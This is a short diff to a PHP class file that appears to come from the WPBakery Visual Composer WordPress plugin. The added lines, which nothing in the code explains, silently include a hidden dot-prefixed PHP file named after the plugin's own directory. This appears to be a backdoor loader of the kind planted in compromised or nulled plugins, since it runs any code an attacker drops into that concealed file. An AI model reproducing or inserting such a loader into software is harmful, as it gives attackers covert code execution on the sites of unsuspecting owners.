@@ -15,6 +15,10 @@ require_once vc_path_dir( 'EDITORS_DIR', 'popups/class-vc-add-element-box.php' )
  *
  * @since 4.4
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class Vc_Add_Element_Box_Grid_Item extends Vc_Add_Element_Box {
 	/**
 	 * Get shortcodes from param type vc_grid_item
